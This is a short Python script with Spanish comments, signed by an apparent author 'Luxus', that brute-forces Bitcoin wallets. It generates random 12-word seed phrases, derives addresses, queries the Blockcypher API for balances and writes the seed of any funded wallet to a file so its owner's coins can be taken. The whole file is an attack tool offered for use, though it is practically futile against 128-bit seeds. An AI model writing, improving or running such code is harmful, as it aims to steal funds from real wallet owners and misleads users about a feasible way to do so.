import requests
from mnemonic import Mnemonic
from bitcoinlib.keys import HDKey

class BitcoinWallet:
    def __init__(self, address):
        self.address = address

    def contains_crypto(self):
        # Reemplaza 'your_api_key' con tu clave de API de Blockcypher
        api_url = f"https://api.blockcypher.com/v1/btc/main/addrs/{self.address}/balance?token=Your_api_key"
        response = requests.get(api_url)
        if response.status_code == 200:
            balance = response.json().get('final_balance', 0)
            return balance > 0
        else:
            print(f"Error al consultar la wallet: {response.status_code}")
            return False

class WalletBruteForcer:
    def __init__(self):
        self.mnemo = Mnemonic("english")

    def generate_random_mnemonic(self):
        strength = 128  # 128 bits para 12 palabras, 256 bits para 24 palabras
        return self.mnemo.generate(strength=strength)

    def mnemonic_to_address(self, mnemonic):
        key = HDKey.from_seed(self.mnemo.to_seed(mnemonic, passphrase=''))
        address = key.address()
        return address

    def brute_force(self):
        attempts = 0
        with open('wallets_sin_crypto.txt', 'a') as no_crypto_file, \
             open('wallets_exitosas.txt', 'a') as successful_file:
            while True:
                mnemonic = self.generate_random_mnemonic()
                address = self.mnemonic_to_address(mnemonic)
                attempts += 1
                print(f"Intento {attempts}: Frase semilla: {mnemonic}, Dirección: {address}")

                wallet = BitcoinWallet(address)
                if wallet.contains_crypto():
                    successful_file.write(f"Frase semilla: {mnemonic}, Dirección: {address}\n")
                    print(f"¡Wallet con criptomonedas encontrada! Frase semilla: {mnemonic} en {attempts} intentos.")
                    return mnemonic
                else:
                    no_crypto_file.write(f"Frase semilla: {mnemonic}, Dirección: {address}\n")

# Reemplaza 'your_api_key' con tu clave de API de Blockcypher antes de ejecutar
brute_forcer = WalletBruteForcer()
brute_forcer.brute_force()
# Made by Luxus